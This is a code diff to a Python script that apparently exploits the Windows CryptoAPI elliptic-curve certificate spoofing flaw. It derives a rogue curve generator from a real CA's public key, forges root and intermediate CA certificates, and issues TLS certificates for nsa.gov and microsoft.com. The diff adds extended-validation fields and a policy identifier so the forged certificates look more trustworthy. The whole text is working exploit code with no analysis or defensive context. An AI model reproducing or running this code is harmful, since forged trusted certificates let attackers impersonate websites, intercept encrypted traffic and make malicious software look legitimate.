@@ -35,6 +35,15 @@ def get_root_ca_cert() -> x509.Certificate:
     raise ValueError("Could not find valid certificate authority")
 
 
+def get_intermediate_ca_cert() -> x509.Certificate:
+    with open("2842897.pem", "rb") as f:
+        pem_bytes = f.read()
+
+    object_type, _, der_bytes = pem.unarmor(pem_bytes)
+    assert object_type == "CERTIFICATE"
+    return x509.Certificate.load(der_bytes)
+
+
 def generate_ec_private_key(name: str) -> keys.ECPrivateKey:
     der_bytes = subprocess.check_output(
         (
@@ -59,7 +68,7 @@ def get_exploit_generator(
     k_inverse = ecdsa.numbertheory.inverse_mod(k, curve.order)
     Q = ecdsa.ellipticcurve.Point(curve.curve, Qx, Qy, curve.order)
     G = Q * k_inverse
-    return (G.x(), G.y())
+    return (int(G.x()), int(G.y()))
 
 
 def curve_from_ec_parameters(parameters: keys.SpecifiedECDomain) -> ecdsa.curves.Curve:
@@ -160,7 +169,8 @@ def random_serial_number() -> int:
 
 
 def write_tls_certificate(
-    root_ca_cert: x509.Certificate,
+    intermediate_ca_cert: x509.Certificate,
+    original_ca_cert: x509.Certificate,
     signing_key: ecdsa.keys.SigningKey,
     name: str,
     subject: x509.Name,
@@ -175,7 +185,7 @@ def write_tls_certificate(
                 "version": "v3",
                 "serial_number": random_serial_number(),
                 "signature": signed_digest_algorithm,
-                "issuer": root_ca_cert.subject,
+                "issuer": intermediate_ca_cert.subject,
                 "validity": {
                     "not_before": x509.UTCTime(
                         datetime.datetime(2018, 1, 1, tzinfo=datetime.timezone.utc)
@@ -200,6 +210,26 @@ def write_tls_certificate(
                             for dns_name in subject_alt_names
                         ],
                     },
+                    {
+                        "extn_id": "key_usage",
+                        "critical": True,
+                        "extn_value": {"digital_signature", "key_encipherment"},
+                    },
+                    {
+                        "extn_id": "extended_key_usage",
+                        "critical": True,
+                        "extn_value": [
+                            "1.3.6.1.5.5.7.3.1",
+                            "1.3.6.1.5.5.7.3.2",
+                        ],
+                    },
+                    {
+                        "extn_id": "certificate_policies",
+                        "critical": False,
+                        "extn_value": [
+                            {"policy_identifier": "1.3.6.1.4.1.34697.2.4"},
+                        ],
+                    },
                 ],
             },
             "signature_algorithm": signed_digest_algorithm,
@@ -210,12 +240,14 @@ def write_tls_certificate(
 
     with open(name + ".crt", "wb") as f:
         write_pem(f, certificate, "CERTIFICATE")
-        write_pem(f, root_ca_cert, "CERTIFICATE")
+        write_pem(f, original_ca_cert, "CERTIFICATE")
+        write_pem(f, intermediate_ca_cert, "CERTIFICATE")
 
     with open(name + ".key", "wb") as f:
         write_pem(f, private_key, "PRIVATE KEY")
         write_pem(f, certificate, "CERTIFICATE")
-        write_pem(f, root_ca_cert, "CERTIFICATE")
+        write_pem(f, original_ca_cert, "CERTIFICATE")
+        write_pem(f, intermediate_ca_cert, "CERTIFICATE")
 
 
 def write_authenticode_certificate(
@@ -317,6 +349,7 @@ def get_name(purpose: Optional[str] = None) -> str:
 
 def main() -> None:
     root_ca_cert = get_root_ca_cert()
+    intermediate_ca_cert = get_intermediate_ca_cert()
 
     issuer = x509.Name.build(
         {
@@ -328,8 +361,10 @@ def main() -> None:
     )
     root_ca_cert["tbs_certificate"]["subject"] = issuer
     root_ca_cert["tbs_certificate"]["issuer"] = issuer
+    intermediate_ca_cert["tbs_certificate"]["issuer"] = intermediate_ca_cert["tbs_certificate"]["subject"]
 
     signing_key, ec_private_key = exploit_certificate(root_ca_cert)
+    tls_signing_key, tls_ec_private_key = exploit_certificate(intermediate_ca_cert)
 
     with open("rootCA.crt", "wb") as f:
         write_pem(f, root_ca_cert, "CERTIFICATE")
@@ -352,13 +387,21 @@ def main() -> None:
     )
 
     write_tls_certificate(
-        root_ca_cert,
-        signing_key,
+        intermediate_ca_cert,
+        get_intermediate_ca_cert(),
+        tls_signing_key,
         "localhost",
         x509.Name.build(
-            {"common_name": get_name("Certificate"), "organization_name": get_name()}
+            {
+                "common_name": get_name("Certificate"),
+                "country_name": "GB",
+                "organization_name": get_name(),
+                "incorporation_country": "GB",
+                "serial_number": "114514810893",
+                "business_category": "Private Organization",
+            },
         ),
-        ("localhost", "nsa.gov", "*.nsa.gov", "microsoft.com", "*.microsoft.com"),
+        ("localhost", "nsa.gov", "microsoft.com"),
     )
 
 
